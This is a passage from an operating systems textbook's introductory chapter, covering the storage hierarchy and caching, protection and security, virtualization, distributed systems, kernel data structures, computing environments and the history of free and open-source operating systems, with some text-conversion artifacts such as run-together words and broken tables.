registers
< 1 KB
custom memory with multiple ports CMOS
0.25-0.5 20,000-100,000
2
cache
< 16MB
on-chip or off- chip CMOS SRAM
0.5-25 5,000-10,000
3
main memory < 64GB
CMOS SRAM
80-250 1,000-5,000
4
solid-state disk < 1 TB
flash memory
25,000-50,000 500
5
magnetic disk < 10 TB
magnetic disk
5,000,000 20-150
                                                                       Managed by compiler hardware operating system operating system operating system Backed by cache main memory disk disk disk or tape
Figure 1.14 Characteristics of various types of storage.
If it is not, we use the information from the source, putting a copy in the cache under
the assumption that we will need it again soon.
In addition, internal programmable registers provide a high-speed cache for main memory. The programmer (or compiler) implements the register- allocation and register-replacement algorithms to decide which information to keep in registers and which to keep in main memory.
Other caches are implemented totally in hardware. For instance, most systems have an instruction cache to hold the instructions expected to be executed next. Without this cache, the CPU would have to wait several cycles while an instruction was fetched from main memory. For similar reasons, most systems have one or more high-speed data caches in the memory hierarchy. We are not concerned with these hardware-only caches in this text, since they are outside the control of the operating system.
Because caches have limited size, cache management is an important design problem. Careful selection of the cache size and of a replacement policy can result in greatly increased performance, as you can see by examining Figure 1.14. Replacement algorithms for software-controlled caches are discussed in Chapter 10.
The movement of information between levels of a storage hierarchy may be either explicit or implicit, depending on the hardware design and the control- ling operating- system software. For instance, data transfer from cache to CPU and registers is usually a hardware function, with no operating-system inter- vention. In contrast, transfer of data from disk to memory is usually controlled by the operating system.
In a hierarchical storage structure, the same data may appear in different levels of the storage system. example, suppose that an integer A that is to be incremented by 1 is located in file B, and file B resides on hard disk. The increment operation proceeds by first issuing an I/O operation to copy the disk block on which A resides to main memory. This operation is followed by copying A to the cache and to an internal register. Thus, the copy of A appears in several places: on the hard disk, in main memory, in the cache, and in an internal register (see Figure 1.15). Once the increment takes place in the internal register, the value of A differs in the various storage systems. The value of A
32 Chapter 1 Introduction
                        magnetic disk A
main memory A
Figure 1.15 Migration of integer A from disk to register.
becomes the same only after the new value of A is written from the internal register
back to the hard disk.
In a computing environment where only one process executes at a time, this arrangement poses no difficulties, since an access to integer A will always be to the copy at the highest level of the hierarchy. However, in a multitasking environment, where the CPU is switched back and forth among various pro- cesses, extreme care must be taken to ensure that, if several processes wish to access A, then each of these processes will obtain the most recently updated value of A.
The situation becomes more complicated in a multiprocessor environment where, in addition to maintaining internal registers, each of the CPUs also contains a local cache (refer back to Figure 1.8). In such an environment, a copy of A may exist simultaneously in several caches. Since the various CPUs can all execute in parallel, we must make sure that an update to the value of A in one cache is immediately reflected in all other caches where A resides. This situation is called cache coherency, and it is usually a hardware issue (handled below the operating-system level).
In a distributed environment, the situation becomes even more complex. In this environment, several copies (or replicas) of the same file can be kept on different computers. Since the various replicas may be accessed and updated concurrently, some distributed systems ensure that, when a replica is updated in one place, all other replicas are brought up to date as soon as possible. There are various ways to achieve this guarantee, as we discuss in Chapter 19.
1.5.6 I/O System Management
One of the purposes of an operating system is to hide the peculiarities of specific hardware devices from the user. example, in UNIX, the peculiarities of I/O devices are hidden from the bulk of the operating system itself by the I/O subsystem. The I/O subsystem consists of several components:
- Amemory-managementcomponentthatincludesbuffering,caching,and spooling
- Ageneraldevice-driverinterface
- Driversforspecifichardwaredevices
Only the device driver knows the peculiarities of the specific device to which it is assigned.
We discussed earlier in this chapter how interrupt handlers and device drivers are used in the construction of efficient I/O subsystems. In Chapter 12, we discuss how the I/O subsystem interfaces to the other system components, manages devices, transfers data, and detects I/O completion.
cache
A
hardware register
1.6 Security and Protection
If a computer system has multiple users and allows the concurrent execution of multiple processes, then access to data must be regulated. For that purpose, mechanisms ensure that files, memory segments, CPU, and other resources can be operated on by only those processes that have gained proper authoriza- tion from the operating system. example, memory-addressing hardware ensures that a process can execute only within its own address space. The timer ensures that no process can gain control of the CPU without eventually relinquishing control. Device-control registers are not accessible to users, so the integrity of the various peripheral devices is protected.
Protection, then, is any mechanism for controlling the access of processes or users to the resources defined by a computer system. This mechanism must provide means to specify the controls to be imposed and to enforce the controls.
Protection can improve reliability by detecting latent errors at the interfaces between component subsystems. Early detection of interface errors can often prevent contamination of a healthy subsystem by another subsystem that is malfunctioning. Furthermore, an unprotected resource cannot defend against use (or misuse) by an unauthorized or incompetent user. A protection-oriented system provides a means to distinguish between authorized and unauthorized usage, as we discuss in Chapter 17.
A system can have adequate protection but still be prone to failure and allow inappropriate access. Consider a user whose authentication information (her means of identifying herself to the system) is stolen. Her data could be copied or deleted, even though file and memory protection are working. It is the job of security to defend a system from external and internal attacks. Such attacks spread across a huge range and include viruses and worms, denial-of- service attacks (which use all of a system’s resources and so keep legitimate users out of the system), identity theft, and theft of service (unauthorized use of a system). Prevention of some of these attacks is considered an operating- system function on some systems, while other systems leave it to policy or additional software. Due to the alarming rise in security incidents, operating- system security features are a fast-growing area of research and implementa- tion. We discuss security in Chapter 16.
Protection and security require the system to be able to distinguish among all its users. Most operating systems maintain a list of user names and asso- ciated user identifier (user IDs). In Windows parlance, this is a security ID (SID). These numerical IDs are unique, one per user. When a user logs in to the system, the authentication stage determines the appropriate user ID for the user. That user ID is associated with all of the user’s processes and threads. When an ID needs to be readable by a user, it is translated back to the user name via the user name list.
In some circumstances, we wish to distinguish among sets of users rather than individual users. example, the owner of a file on a UNIX system may be allowed to issue all operations on that file, whereas a selected set of users may be allowed only to read the file. To accomplish this, we need to define a group name and the set of users belonging to that group. Group functionality can be implemented as a system-wide list of group names and group identifier . A user can be in one or more groups, depending on operating-system design
1.6 Security and Protection 33 34 Chapter 1 Introduction
decisions. The user’s group IDs are also included in every associated process and thread.
In the course of normal system use, the user ID and group ID for a user are sufficient. However, a user sometimes needs to escalate privileges to gain extra permissions for an activity. The user may need access to a device that is restricted, example. Operating systems provide various methods to allow privilege escalation. On UNIX, for instance, the setuid attribute on a program causes that program to run with the user ID of the owner of the file, rather than the current user’s ID. The process runs with this effective UID until it turns off the extra privileges or terminates.
^ chapter 1.7 Virtualization
Virtualization is a technology that allows us to abstract the hardware of a sin- gle computer (the CPU, memory, disk drives, network interface cards, and so forth) into several different execution environments, thereby creating the illu- sion that each separate environment is running on its own private computer. These environments can be viewed as different individual operating systems (example, Windows and UNIX) that may be running at the same time and may interact with each other. A user of a virtual machine can switch among the various operating systems in the same way a user can switch among the various processes running concurrently in a single operating system.
Virtualization allows operating systems to run as applications within other operating systems. At first blush, there seems to be little reason for such func- tionality. But the virtualization industry is vast and growing, which is a testa- ment to its utility and importance.
Broadly speaking, virtualization software is one member of a class that also includes emulation. Emulation, which involves simulating computer hard- ware in software, is typically used when the source CPU type is different from the target CPU type. example, when Apple switched from the IBM Power CPU to the Intel x86 CPU for its desktop and laptop computers, it included an emulation facility called “Rosetta,” which allowed applications compiled for the IBM CPU to run on the Intel CPU. That same concept can be extended to allow an entire operating system written for one platform to run on another. Emula- tion comes at a heavy price, however. Every machine-level instruction that runs natively on the source system must be translated to the equivalent function on the target system, frequently resulting in several target instructions. If the source and target CPUs have similar performance levels, the emulated code may run much more slowly than the native code.
With virtualization, in contrast, an operating system that is natively com- piled for a particular CPU architecture runs within another operating system also native to that CPU. Virtualization first came about on IBM mainframes as a method for multiple users to run tasks concurrently. Running multiple vir- tual machines allowed (and still allows) many users to run tasks on a system designed for a single user. Later, in response to problems with running multiple Microsoft Windows applications on the Intel x86 CPU, VMware created a new virtualization technology in the form of an application that ran on Windows. That application ran one or more guest copies of Windows or other native x86 operating systems, each running its own applications. (See Figure 1.16.)
Windows was the host operating system, and the VMware application was the virtual machine manager (VMM). The VMM runs the guest operating systems, manages their resource use, and protects each guest from the others.
Even though modern operating systems are fully capable of running multi- ple applications reliably, the use of virtualization continues to grow. On laptops and desktops, a VMM allows the user to install multiple operating systems for exploration or to run applications written for operating systems other than the native host. example, an Apple laptop running macOS on the x86 CPU can run a Windows 10 guest to allow execution of Windows applications. Com- panies writing software for multiple operating systems can use virtualization to run all of those operating systems on a single physical server for develop- ment, testing, and debugging. Within data centers, virtualization has become a common method of executing and managing computing environments. VMMs like VMware ESXand Citrix XenServer no longer run on host operating systems but rather are the host operating systems, providing services and resource management to virtual machine processes.
With this text, we provide a Linux virtual machine that allows you to run Linux—as well as the development tools we provide—on your personal system regardless of your host operating system. Full details of the features and implementation of virtualization can be found in Chapter 18.
1.8 Distributed Systems
A distributed system is a collection of physically separate, possibly heteroge- neous computer systems that are networked to provide users with access to the various resources that the system maintains. Access to a shared resource increases computation speed, functionality, data availability, and reliability. Some operating systems generalize network access as a form of file access, with the details of networking contained in the network interface’s device driver.
Others make users specifically invoke network functions. Generally, systems contain a mix of the two modes—example FTP and NFS. The protocols that create a distributed system can greatly affect that system’s utility and popularity.
A network, in the simplest terms, is a communication path between two or more systems. Distributed systems depend on networking for their functional- ity. Networks vary by the protocols used, the distances between nodes, and the transport media. TCP/ IP is the most common network protocol, and it provides the fundamental architecture of the Internet. Most operating systems support TCP/IP, including all general-purpose ones. Some systems support proprietary protocols to suit their needs. For an operating system, it is necessary only that a network protocol have an interface device—a network adapter, example —with a device driver to manage it, as well as software to handle data. These concepts are discussed throughout this book.
Networks are characterized based on the distances between their nodes. A local-area network (LAN) connects computers within a room, a building, or a campus. A wide- area network (WAN) usually links buildings, cities, or countries. A global company may have a WAN to connect its offices worldwide, example. These networks may run one protocol or several protocols. The continuing advent of new technologies brings about new forms of networks. example, a metropolitan-area network (MAN) could link buildings within a city. BlueTooth and 802.11 devices use wireless technology to communicate over a distance of several feet, in essence creating a personal-area network (PAN) between a phone and a headset or a smartphone and a desktop computer.
The media to carry networks are equally varied. They include copper wires, fiber strands, and wireless transmissions between satellites, microwave dishes, and radios. When computing devices are connected to cellular phones, they create a network. Even very short-range infrared communication can be used for networking. At a rudimentary level, whenever computers communicate, they use or create a network. These networks also vary in their performance and reliability.
Some operating systems have taken the concept of networks and dis- tributed systems further than the notion of providing network connectivity. A network operating system is an operating system that provides features such as file sharing across the network, along with a communication scheme that allows different processes on different computers to exchange messages. A computer running a network operating system acts autonomously from all other computers on the network, although it is aware of the network and is able to communicate with other networked computers. A distributed operat- ing system provides a less autonomous environment. The different computers communicate closely enough to provide the illusion that only a single operat- ing system controls the network. We cover computer networks and distributed systems in Chapter 19.
1.9 Kernel Data Structures
We turn next to a topic central to operating-system implementation: the way data are structured in the system. In this section, we briefly describe several fundamental data structures used extensively in operating systems. Readers data data data
1.9 Kernel Data Structures 37 null •••
Figure 1.17 Singly linked list.
who require further details on these structures, as well as others, should consult
the bibliography at the end of the chapter.
1.9.1 Lists, Stacks, and Queues
An array is a simple data structure in which each element can be accessed directly. example, main memory is constructed as an array. If the data item being stored is larger than one byte, then multiple bytes can be allocated to the item, and the item is addressed as “item number × item size.” But what about storing an item whose size may vary? And what about removing an item if the relative positions of the remaining items must be preserved? In such situations, arrays give way to other data structures.
After arrays, lists are perhaps the most fundamental data structures in com- puter science. Whereas each item in an array can be accessed directly, the items in a list must be accessed in a particular order. That is, a list represents a collec- tion of data values as a sequence. The most common method for implementing this structure is a linked list, in which items are linked to one another. Linked lists are of several types:
In a singly linked list, each item points to its successor, as illustrated in Figure 1.17. Inadoublylinkedlist,agivenitemcanrefereithertoitspredecessororto its successor, as
illustrated in Figure 1.18.
In a circularly linked list, the last element in the list refers to the first element, rather than to null, as illustrated in Figure 1.19.
Linked lists accommodate items of varying sizes and allow easy insertion and deletion of items. One potential disadvantage of using a list is that per- formance for retrieving a specified item in a list of size n is linear—O(n), as it requires potentially traversing all n elements in the worst case. Lists are some- times used directly by kernel algorithms. Frequently, though, they are used for constructing
       more powerful data structures, such as stacks and queues.
A stack is a sequentially ordered data structure that uses the last in, first out (LIFO) principle for adding and removing items, meaning that the last item
data null data data
Figure 1.18 Doubly linked list. data null
•••
38 Chapter 1 Introduction data data data
data
•••
Figure 1.19 Circularly linked list.
placed onto a stack is the first item removed. The operations for inserting and removing items from a stack are known as push and pop, respectively. An operating system often uses a stack when invoking function calls. Parameters, local variables, and the return address are pushed onto the stack when a function is called; returning from the function call pops those items off the stack.
A queue, in contrast, is a sequentially ordered data structure that uses the first in, first out (FIFO) principle: items are removed from a queue in the order in which they were inserted. There are many everyday examples of queues, including shoppers waiting in a checkout line at a store and cars waiting in line at a traffic signal. Queues are also quite common in operating systems—jobs that are sent to a printer are typically printed in the order in which they were submitted, example. As we shall see in Chapter 5, tasks that are waiting to be run on an available CPU are often organized in queues.
1.9.2 Trees
                     A tree is a data structure that can be used to represent data hierarchically. Data values in a tree structure are linked through parent–child relationships. In a general tree, a parent may have an unlimited number of children. In a binary tree, a parent may have at most two children, which we term the left child and the right child. A binary search tree additionally requires an ordering between the parent’s two children in which left child <= right child. Figure 1.20 provides an example of a binary search tree. When we search for an item in a binary search tree, the worst-case performance is O(n) (consider how this can occur). To remedy this situation, we can use an algorithm to create a balanced binary search tree. Here, a tree containing n items has at most lg n levels, thus ensuring worst-case performance of O(lg n). We shall see in Section 5.7.1 that Linux uses a balanced binary search tree (known as a red-black tree) as part its CPU- scheduling algorithm.
1.9.3 Hash Functions and Maps
A hash function takes data as its input, performs a numeric operation on the data, and returns a numeric value. This numeric value can then be used as an index into a table (typically an array) to quickly retrieve the data. Whereas searching for a data item through a list of size n can require up to O(n) compar- isons, using a hash function for retrieving data from a table can be as good as O(1), depending on implementation details. Because of this performance, hash functions are used extensively in operating systems.
One potential difficulty with hash functions is that two unique inputs can result in the same output value—that is, they can link to the same table
12
1.9 Kernel Data Structures 39 17 35
6 14 40
38
Figure 1.20 Binary search tree.
         location. We can accommodate this hash collision by having a linked list at the table location that contains all of the items with the same hash value. Of course, the more collisions there are, the less efficient the hash function is.
One use of a hash function is to implement a hash map, which associates (or maps) [key:value] pairs using a hash function. Once the mapping is estab- lished, we can apply the hash function to the key to obtain the value from the hash map (Figure 1.21). example, suppose that a user name is mapped to a password. Password authentication then proceeds as follows: a user enters her user name and password. The hash function is applied to the user name, which is then used to retrieve the password. The retrieved password is then compared with the password entered by the user for authentication.
1.9.4 Bitmaps
A bitmap is a string of n binary digits that can be used to represent the status of n items. example, suppose we have several resources, and the availability of each resource is indicated by the value of a binary digit: 0 means that the resource is available, while 1 indicates that it is unavailable (or vice versa). The
hash_function(key) 01..n
value
Figure 1.21 Hash map. hash map
40 Chapter 1 Introduction
LINUX KERNEL DATA STRUCTURES
The data structures used in the Linux kernel are available in the kernel source code. The include file <linux/list.h> provides details of the linked-list data structure used throughout the kernel. A queue in Linux is known as a kfifo, and its implementation can be found in the kfifo.c file in the kernel directory of the source code. Linux also
           provides a balanced binary search tree implementation using red-black trees. Details can be found in the include file <linux/rbtree.h>.
value of the ith position in the bitmap is associated with the ith resource. example, consider the bitmap shown below:
001011101
Resources 2, 4, 5, 6, and 8 are unavailable; resources 0, 1, 3, and 7 are available. The power of bitmaps becomes apparent when we consider their space efficiency. If we were to use an eight-bit Boolean value instead of a single bit, the resulting data structure would be eight times larger. Thus, bitmaps are commonly used when there is a need to represent the availability of a large number of resources. Disk drives provide a nice illustration. A medium-sized disk drive might be divided into several thousand individual units, called disk
blocks. A bitmap can be used to indicate the availability of each disk block. In summary, data structures are pervasive in operating system implemen- tations. Thus, we will see the structures discussed here, along with others, throughout this text as we explore kernel algorithms and their implementa-
tions.
1.10 Computing Environments
So far, we have briefly described several aspects of computer systems and the operating systems that manage them. We turn now to a discussion of how operating systems are used in a variety of computing environments.
1.10.1 Traditional Computing
As computing has matured, the lines separating many of the traditional computing environments have blurred. Consider the “typical office environment.” Just a few years ago, this environment consisted of PCs connected to a network, with servers providing file and print services. Remote access was awkward, and portability was achieved by use of laptop computers.
Today, web technologies and increasing WAN bandwidth are stretching the boundaries of traditional computing. Companies establish portals, which pro- vide web accessibility to their internal servers. Network computers (or thin clients) — which are essentially terminals that understand web-based comput- ing—are used in place of traditional workstations where more security or easier maintenance is desired. Mobile computers can synchronize with PCs to allow very portable use of company information. Mobile devices can also
1.10 Computing Environments 41
connect to wireless networks and cellular data networks to use the company’s web
portal (as well as the myriad other web resources).
At home, most users once had a single computer with a slow modem con- nection to the office, the Internet, or both. Today, network-connection speeds once available only at great cost are relatively inexpensive in many places, giving home users more access to more data. These fast data connections are allowing home computers to serve up web pages and to run networks that include printers, client PCs, and servers. Many homes use firewall to pro- tect their networks from security breaches. Firewalls limit the communications between devices on a network.
In the latter half of the 20th century, computing resources were relatively scarce. (Before that, they were nonexistent!) For a period of time, systems were either batch or interactive. Batch systems processed jobs in bulk, with prede- termined input from files or other data sources. Interactive systems waited for input from users. To optimize the use of the computing resources, multiple users shared time on these systems. These time-sharing systems used a timer and scheduling algorithms to cycle processes rapidly through the CPU, giving each user a share of the resources.
Traditional time-sharing systems are rare today. The same scheduling tech- nique is still in use on desktop computers, laptops, servers, and even mobile computers, but frequently all the processes are owned by the same user (or a single user and the operating system). User processes, and system processes that provide services to the user, are managed so that each frequently gets a slice of computer time. Consider the windows created while a user is working on a PC, example, and the fact that they may be performing different tasks at the same time. Even a web browser can be composed of multiple processes, one for each website currently being visited, with time sharing applied to each web browser process.
1.10.2 Mobile Computing
Mobile computing refers to computing on handheld smartphones and tablet computers. These devices share the distinguishing physical features of being portable and lightweight. Historically, compared with desktop and laptop computers, mobile systems gave up screen size, memory capacity, and overall functionality in return for handheld mobile access to services such as e-mail and web browsing. Over the past few years, however, features on mobile devices have become so rich that the distinction in functionality between, say, a consumer laptop and a tablet computer may
 be difficult to discern. In fact, we might argue that the features of a contemporary mobile device allow it to provide functionality that is either unavailable or impractical on a desktop or laptop computer.
Today, mobile systems are used not only for e-mail and web browsing but also for playing music and video, reading digital books, taking photos, and recording and editing high-definition video. Accordingly, tremendous growth continues in the wide range of applications that run on such devices. Many developers are now designing applications that take advantage of the unique features of mobile devices, such as global positioning system (GPS) chips, accelerometers, and gyroscopes. An embedded GPS chip allows a mobile device to use satellites to determine its precise location on Earth. That functionality is
42 Chapter 1 Introduction
especially useful in designing applications that provide navigation — for exam- ple, telling users which way to walk or drive or perhaps directing them to nearby services, such as restaurants. An accelerometer allows a mobile device to detect its orientation with respect to the ground and to detect certain other forces, such as tilting and shaking. In several computer games that employ accelerometers, players interface with the system not by using a mouse or a keyboard but rather by tilting, rotating, and shaking the mobile device! Perhaps more a practical use of these features is found in augmented-reality appli- cations, which overlay information on a display of the current environment. It is difficult to imagine how equivalent applications could be developed on traditional laptop or desktop computer systems.
To provide access to on-line services, mobile devices typically use either IEEE standard 802.11 wireless or cellular data networks. The memory capacity and processing speed of mobile devices, however, are more limited than those of PCs. Whereas a smartphone or tablet may have 256 GB in storage, it is not uncommon to find 8 TB in storage on a desktop computer. Similarly, because power consumption is such a concern, mobile devices often use processors that are smaller, are slower, and offer fewer processing cores than processors found on traditional desktop and laptop computers.
Two operating systems currently dominate mobile computing: Apple iOS and Google Android. iOS was designed to run on Apple iPhone and iPad mobile devices. Android powers smartphones and tablet computers available from many manufacturers. We examine these two mobile operating systems in further detail in Chapter 2.
1.10.3 Client–Server Computing
Contemporary network architecture features arrangements in which server systems satisfy requests generated by client systems. This form of specialized distributed system, called a client–server system, has the general structure depicted in Figure 1.22.
Server systems can be broadly categorized as compute servers and file servers:
- The compute-server system provides an interface to which a client can send a request to perform an action (example, read data). In response, the server executes the
action and sends the results to the client. A server
server
Figure 1.22
network
client desktop client laptop client smartphone
General structure of a client–server system.
1.10 Computing Environments 43 running a database that responds to client requests for data is an example
of such a system.
- The file-serve system provides a file-system interface where clients can create,
update, read, and delete files. An example of such a system is a web server that delivers files to clients running web browsers. The actual contents of the files can vary greatly, ranging from traditional web pages to rich multimedia content such as high-definition video.
1.10.4 Peer-to-Peer Computing
Another structure for a distributed system is the peer-to-peer (P2P) system model. In this model, clients and servers are not distinguished from one another. Instead, all
         nodes within the system are considered peers, and each may act as either a client or a server, depending on whether it is requesting or providing a service. Peer-to-peer systems offer an advantage over traditional client – server systems. In a client – server system, the server is a bottleneck; but in a peer-to-peer system, services can be provided by several nodes distributed throughout the network.
To participate in a peer-to-peer system, a node must first join the network of peers. Once a node has joined the network, it can begin providing services to—and requesting services from—other nodes in the network. Determining what services are available is accomplished in one of two general ways:
When a node joins a network, it registers its service with a centralized lookup service on the network. Any node desiring a specific service first contacts this centralized lookup service to determine which node provides the service. The remainder of the communication takes place between the client and the service provider.
An alternative scheme uses no centralized lookup service. Instead, a peer acting as a client must discover what node provides a desired service by broadcasting a request for the service to all other nodes in the network. The node (or nodes) providing that service responds to the peer making the request. To support this approach, a discovery protocol must be pro- vided that allows peers to discover services provided by other peers in the network. Figure 1.23 illustrates such a scenario.
Peer-to-peer networks gained widespread popularity in the late 1990s with several file-sharing services, such as Napster and Gnutella, that enabled peers to exchange files with one another. The Napster system used an approach simi- lar to the first type described above: a centralized server maintained an index of all files stored on peer nodes in the Napster network, and the actual exchange of files took place between the peer nodes. The Gnutella system used a tech- nique similar to the second type: a client broadcast file requests to other nodes in the system, and nodes that could service the request responded directly to the client. Peer-to-peer networks can be used to exchange copyrighted mate- rials (music, example) anonymously, and there are laws governing the distribution of copyrighted material. Notably, Napster ran into legal trouble for copyright infringement, and its services were shut down in 2001. For this reason, the future of exchanging files remains uncertain. 44 Chapter 1 Introduction client
client
client
client client
Figure 1.23 Peer-to-peer system with no centralized service.
Skype is another example of peer-to-peer computing. It allows clients to make voice calls and video calls and to send text messages over the Internet using a technology known as voice over IP (VoIP). Skype uses a hybrid peer- to-peer approach. It includes a centralized login server, but it also incorporates decentralized peers and allows two peers to communicate.
1.10.5 Cloud Computing
Cloud computing is a type of computing that delivers computing, storage, and even applications as a service across a network. In some ways, it’s a logical extension of virtualization, because it uses virtualization as a base for its functionality. example, the Amazon Elastic Compute Cloud (ec2) facility has thousands of servers, millions of virtual machines, and petabytes of storage available for use by anyone on the Internet. Users pay per month based on how much of those resources they use. There are actually many types of cloud computing, including the following:
Publiccloud—acloudavailableviatheInternettoanyonewillingtopay for the services 800

Privatecloud—acloudrunbyacompanyforthatcompany’sownuse
Hybrid cloud—a cloud that includes both public and private cloud com-
ponents
Software as a service (SaaS)—one or more applications (such as word processors or spreadsheets) available via the Internet
Platform as a service (PaaS)—a software stack ready for application use via the Internet (example, a database server)
Infrastructure as a service (IaaS)—servers or storage available over the Internet (example, storage available for making backup copies of pro- duction data)
1.10 Computing Environments 45 Internet
customer requests
servers
servers
Figure 1.24
cloud management commands
        Cloud computing.
These cloud-computing types are not discrete, as a cloud computing environ- ment may provide a combination of several types. example, an organiza- tion may provide both SaaS and IaaS as publicly available services.
Certainly, there are traditional operating systems within many of the types of cloud infrastructure. Beyond those are the VMMs that manage the virtual machines in which the user processes run. At a higher level, the VMMs them- selves are managed by cloud management tools, such as VMware vCloud Director and the open-source Eucalyptus toolset. These tools manage the resources within a given cloud and provide interfaces to the cloud components, making a good argument for considering them a new type of operating system.
Figure 1.24 illustrates a public cloud providing IaaS. Notice that both the cloud services and the cloud user interface are protected by a firewall.
1.10.6 Real-Time Embedded Systems
Embedded computers are the most prevalent form of computers in existence. These devices are found everywhere, from car engines and manufacturing robots to optical drives and microwave ovens. They tend to have very specific tasks. The systems they run on are usually primitive, and so the operating systems provide limited features. Usually, they have little or no user interface, preferring to spend their time monitoring and managing hardware devices, such as automobile engines and robotic arms.
These embedded systems vary considerably. Some are general-purpose computers, running standard operating systems — such as Linux — with special-purpose applications to implement the functionality. Others are hardware devices with a special-purpose embedded operating system providing just the functionality desired. Yet others are hardware devices
cloud customer interface  firewall
load balancer
virtual machines
virtual machines
storage
cloud managment services
46 Chapter 1 Introduction
with application-specific integrated circuits (ASICs) that perform their tasks without an operating system.
The use of embedded systems continues to expand. The power of these devices, both as standalone units and as elements of networks and the web, is sure to increase as well. Even now, entire houses can be computerized, so that a central computer — either a general-purpose computer or an embedded system —can control heating and lighting, alarm systems, and even coffee makers. Web access can enable a home owner to tell the house to heat up before she arrives home. Someday, the refrigerator will be able to notify the grocery store when it notices the milk is gone.
Embedded systems almost always run real-time operating systems. A real- time system is used when rigid time requirements have been placed on the operation of a processor or the flow of data; thus, it is often used as a control device in a dedicated application. Sensors bring data to the computer. The com- puter must analyze the data and possibly adjust controls to modify the sensor inputs. Systems that control scientific experiments, medical imaging systems, industrial control systems, and certain display systems are real-time systems. Some automobile-engine fuel-injection systems, home- appliance controllers, and weapon systems are also real-time systems.
A real-time system has well-defined, fixed time constraints. Processing must be done within the defined constraints, or the system will fail. For instance, it would not do for
             a robot arm to be instructed to halt after it had smashed into the car it was building. A real-time system functions correctly only if it returns the correct result within its time constraints. Contrast this sys- tem with a traditional laptop system where it is desirable (but not mandatory) to respond quickly.
In Chapter 5, we consider the scheduling facility needed to implement real- time functionality in an operating system, and in Chapter 20 we describe the real-time components of Linux.
1.11 Free and Open-Source Operating Systems
The study of operating systems has been made easier by the avail- ability of a vast number of free software and open-source releases. Both free operating systems and open-source operating systems are available in source-code format rather than as compiled binary code. Note, though, that free software and open-source software are two different ideas championed by different groups of people (see http://gnu.org/ philosophy/open-source-misses-the-point.html/ for a discussion on the topic). Free software (sometimes referred to as free/libre software) not only makes source code available but also is licensed to allow no-cost use, redistribution, and modification. Open-source software does not necessarily offer such licensing. Thus, although all free software is open source, some open-source software is not “free.” GNU/Linux is the most famous open-source operating system, with some distributions free and others open source only (http://www.gnu.org/distros/). Microsoft Windows is a well-known example of the opposite closed-source approach. Windows is proprietary software—Microsoft owns it, restricts its use, and carefully protects its source code. Apple’s macOS operating system comprises a hybrid
1.11 Free and Open-Source Operating Systems 47
approach. It contains an open-source kernel named Darwin but includes proprietary,
closed-source components as well.
Starting with the source code allows the programmer to produce binary code that can be executed on a system. Doing the opposite—reverse engi- neering the source code from the binaries—is quite a lot of work, and useful items such as comments are never recovered. Learning operating systems by examining the source code has other benefits as well. With the source code in hand, a student can modify the operating system and then compile and run the code to try out those changes, which is an excellent learning tool. This text includes projects that involve modifying operating-system source code, while also describing algorithms at a high level to be sure all important operating- system topics are covered. Throughout the text, we provide pointers to examples of open-source code for deeper study. There are many benefits to open-source operating systems, including a community of interested (and usually unpaid) programmers who contribute to the code by helping to write it, debug it, analyze it, provide support, and sug- gest changes. Arguably, open- source code is more secure than closed-source code because many more eyes are viewing the code. Certainly, open-source code has bugs, but open-source advocates argue that bugs tend to be found and fixed faster owing to the number of people using and viewing the code. Companies that earn revenue from selling their programs often hesitate to open-source their code, but Red Hat and a myriad of other companies are doing just that and showing that commercial companies benefit, rather than suffer, when they open-source their code. Revenue can be generated through support contracts and the sale of hardware on which the software runs, example.
1.11.1 History
In the early days of modern computing (that is, the 1950s), software generally came with source code. The original hackers (computer enthusiasts) at MIT’s Tech Model Railroad Club left their programs in drawers for others to work on. “Homebrew” user groups exchanged code during their meetings. Company- specific user groups, such as Digital Equipment Corporation’s DECUS, accepted contributions of source-code programs, collected them onto tapes, and dis- tributed the tapes to interested members. In 1970, Digital’s operating systems were distributed as source code with no restrictions or copyright notice.
Computer and software companies eventually sought to limit the use of their software to authorized computers and paying customers. Releasing only the binary files compiled from the source code, rather than the source code itself, helped them to achieve this goal, as well as protecting their code and their ideas from their competitors. Although the Homebrew user groups of the 1970s exchanged code during their meetings, the operating systems for hobbyist machines (such as CPM) were proprietary. By 1980, proprietary software was the usual case.
1.11.2 Free Operating Systems
To counter the move to limit software use and redistribution, Richard Stallman in 1984 started developing a free, UNIX-compatible operating system called GNU(which is a recursive acronym for “GNU’s Not Unix!”). To Stallman, “free” refers to freedom of use, not price. The free-software movement does not object
48 Chapter 1 Introduction
to trading a copy for an amount of money but holds that users are entitled to four certain freedoms: (1) to freely run the program, (2) to study and change the source code, and to give or sell copies either (3) with or (4) without changes. In 1985, Stallman published the GNU Manifesto, which argues that all software should be free. He also formed the Free Software Foundation (FSF) with the goal of encouraging the use and development of free software.
The FSF uses the copyrights on its programs to implement “copyleft,” a form of licensing invented by Stallman. Copylefting a work gives anyone that possesses a copy of the work the four essential freedoms that make the work free, with the condition that redistribution must preserve these freedoms. The GNU General Public License (GPL) is a common license under which free software is released. Fundamentally, the GPL requires that the source code be distributed with any binaries and that all copies (including modified versions) be released under the same GPL license. The Creative Commons “Attribution Sharealike” license is also a copyleft license; “sharealike” is another way of stating the idea of copyleft.
1.11.3 GNU/Linux
example of a free and open-source operating system, consider GNU/Linux. By 1991, the GNU operating system was nearly complete. The GNU Project had developed compilers, editors, utilities, libraries, and games — whatever parts it could not find elsewhere. However, the GNU kernel never became ready for prime time. In 1991, a student in Finland, Linus Torvalds, released a rudimentary UNIX-like kernel using the GNU compilers and tools and invited contributions worldwide. The advent of the Internet meant that anyone interested could download the source code, modify it, and submit changes to Torvalds. Releasing updates once a week allowed this so-called “Linux” operating system to grow rapidly, enhanced by several thousand programmers. In 1991, Linux was not free software, as its license permitted only noncommercial redistribution. In 1992, however, Torvalds rereleased Linux under the GPL, making it free software (and also, to use a term coined later, “open source”).
The resulting GNU/Linux operating system (with the kernel properly called Linux but the full operating system including GNU tools called GNU/Linux) has spawned hundreds of unique distributions, or custom builds, of the system. Major distributions include Red Hat, SUSE, Fedora, Debian, Slackware, and Ubuntu. Distributions vary in function, utility, installed applications, hardware support, user interface, and purpose. example, Red Hat Enterprise Linux is geared to large commercial use. PCLinuxOS is a live CD—an operating system that can be booted and run from a CD-ROM without being installed on a system’s boot disk. A variant of PCLinuxOS—called PCLinuxOS Supergamer DVD—is a live DVD that includes graphics drivers and games. A gamer can run it on any compatible system simply by booting from the DVD. When the gamer is finished, a reboot of the system resets it to its installed operating system.
You can run Linux on a Windows (or other) system using the following simple, free approach:
1.11 Free and Open-Source Operating Systems 49
1. Download the free Virtualbox VMM tool from https://www.virtualbox.org/
and install it on your system.
2. Choose to install an operating system from scratch, based on an installation image like a CD, or choose pre-built operating-system images that can be installed and run more quickly from a site like
http://virtualboxes.org/images/
These images are preinstalled with operating systems and applications and include many flavors of GNU/Linux.
